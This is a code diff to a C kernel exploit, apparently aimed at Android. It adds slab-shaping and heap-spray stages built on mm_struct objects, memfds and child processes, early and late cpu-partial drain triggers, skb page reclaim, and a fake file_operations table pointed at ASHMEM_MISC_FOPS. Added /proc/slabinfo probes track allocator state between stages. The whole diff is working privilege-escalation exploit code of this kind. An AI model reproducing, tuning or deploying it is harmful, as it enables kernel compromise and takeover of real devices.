@@ -119,6 +119,29 @@ static void log_mm_slabinfo(const char *stage) {
     pr_warning("mm slabinfo stage=%s entry missing\n", stage);
   }
 }
+
+#endif
+
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+static void touch_mm_slabinfo(void) {
+  FILE *fp = fopen("/proc/slabinfo", "re");
+  if (!fp) {
+    return;
+  }
+  char line[512];
+  unsigned long values[8];
+  while (fgets(line, sizeof(line), fp)) {
+    if (memcmp(line, "mm_struct ", 10)) {
+      continue;
+    }
+    sscanf(line,
+           "mm_struct %lu %lu %lu %lu %lu : tunables %*lu %*lu %*lu : slabdata %lu %lu %lu",
+           &values[0], &values[1], &values[2], &values[3], &values[4],
+           &values[5], &values[6], &values[7]);
+    break;
+  }
+  fclose(fp);
+}
 #endif
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -1304,6 +1327,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_fops = payload_base + FOPS_TABLE_OFF;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
+#if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
     slide_bank_payload_base = payload_base;
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
     p0_gate_page_struct = direct_to_page(base);
@@ -1347,6 +1371,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #else
     slide_bank_parents[0] = fake_fops;
     slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+#endif
+#else
+    slide_oracle_parent = fake_fops;
+    slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
 #endif
   }
 #endif
@@ -1453,7 +1481,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
        */
       put_fake_fops_table(p, APP_FOPS_TABLE_MIRROR_OFF);
 #endif
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
+    (!defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE)
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
       memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
       put_slide_bank_entry(
@@ -1602,6 +1631,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
@@ -1617,6 +1649,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -1668,6 +1703,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     kill_child(pre_ctx.childs[i]);
@@ -1682,6 +1720,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.childs[i] = -1;
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
 #endif
@@ -1850,6 +1891,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   msg.msg_iovlen = 1;
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
   /*
    * Make the target-release-to-skb-reclaim interval free of stdio flushes.
@@ -1865,6 +1909,27 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+  size_t early_drain_triggers = 0;
+#ifdef APP_MM_EARLY_DRAIN_TRIGGERS
+  early_drain_triggers = APP_MM_EARLY_DRAIN_TRIGGERS;
+  size_t early_prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
+  if (early_drain_triggers > early_prepare_slabs) {
+    early_drain_triggers = early_prepare_slabs;
+  }
+  for (size_t i = 0; i < early_drain_triggers; i++) {
+    size_t index = i * mm_objs_per_slab;
+    SYSCHK(close(prepare_ctx.memfds[index]));
+    prepare_ctx.memfds[index] = -1;
+    kill_child(prepare_ctx.childs[index]);
+    prepare_ctx.childs[index] = -1;
+  }
+#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
+  pr_info("mm early cpu-partial drain triggers=%zu\n", early_drain_triggers);
+#endif
+#endif
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
   for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
@@ -1874,7 +1939,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pre_ctx.memfds[target_pre] = -1;
   SYSCHK(close(post_ctx.memfds[0]));
   post_ctx.memfds[0] = -1;
-#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
+#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW) && \
+    (!defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET)
   pr_info("mm target-neighbor slab queued for late drain\n");
 #endif
   for (size_t i = 0; i < target_pre; i++) {
@@ -1896,9 +1962,17 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
-  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
+  size_t prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
+  size_t drain_start = early_drain_triggers;
+  size_t drain_triggers = prepare_slabs - drain_start;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
   drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
@@ -1908,7 +1982,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
 #endif
   for (size_t i = 0; i < drain_triggers; i++) {
-    size_t index = i * mm_objs_per_slab;
+    size_t index = (drain_start + i) * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
     prepare_ctx.memfds[index] = -1;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -1948,13 +2022,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
+#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
 #endif
-  int reclaim_sends = SKB_RECLAIM_SENDS;
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
 #endif
+  int reclaim_sends = SKB_RECLAIM_SENDS;
   int reclaim_sent = 0;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   int reclaim_errno = 0;
@@ -1970,6 +2046,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     reclaim_sent++;
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   for (size_t i = 0; i < deferred_reap_count; i++) {
     SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
